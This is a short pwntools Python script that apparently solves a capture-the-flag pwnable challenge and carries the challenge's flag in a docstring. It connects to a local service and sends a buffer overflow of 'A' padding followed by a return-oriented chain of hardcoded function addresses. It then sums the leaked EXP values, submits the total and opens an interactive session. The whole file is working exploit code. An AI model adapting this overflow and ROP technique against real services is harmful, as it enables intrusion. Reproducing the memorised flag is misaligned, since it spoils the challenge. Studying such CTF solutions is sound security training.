
from pwn import *
import re

"""
FLAG: Magic_spell_1s_4vad4_K3daVr4!
"""
# payload handler
payload = "200"

# payload2 handler
payload2 = "123\x00" + "A" * 116
payload2 +=  p32(0x0809fe4b)  # A
payload2 += p32(0x0809fe6a)  # B
payload2 += p32(0x0809fe89)  # C
payload2 += p32(0x0809fea8)  # D
payload2 += p32(0x0809fec7)  # E
payload2 += p32(0x0809fee6)  # F
payload2 += p32(0x0809ff05)  # G
payload2 += p32(0x0809fff4)  # ropme

sh = remote("127.0.0.1", 9032)
sh.recv()
sh.sendline(payload)
sh.recv()
sh.sendline(payload2)

#-----------------------

sh.recv()
data = sh.recv()
EXP = list()

for i in data.split("\n")[1:-1]:
    print(i)
    EXP.append(int(re.match("You found \".*\" \(EXP \+(-?\d+)\)", i).groups()[0]))

print(EXP)
print(sum(EXP))
sh.sendline(payload)
sh.recv()
sh.sendline(str(sum(EXP)))
sh.interactive()

